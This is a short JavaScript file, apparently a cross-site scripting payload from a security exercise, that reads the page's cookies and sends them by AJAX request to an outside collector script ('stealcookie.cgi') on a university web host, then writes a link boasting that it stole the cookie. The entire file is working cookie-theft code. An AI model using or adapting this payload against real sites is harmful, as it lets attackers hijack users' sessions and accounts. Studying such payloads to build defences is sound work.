var xmlHttp = new XMLHttpRequest();
var cookie = document.cookie;
//cookie = "this_is_from_evil_AJAX";
var sendURL = "http://www.cs.virginia.edu/~yz8ra/stealcookie.cgi?cookie="+cookie+"__by_AJAX";
xmlHttp.overrideMimeType('text/xml');
xmlHttp.open('GET',sendURL,true);
xmlHttp.send(null);
document.write("<div> <a href="+sendURL+">I stole your cookie value by AJAX! "+cookie+"</a> </div>");
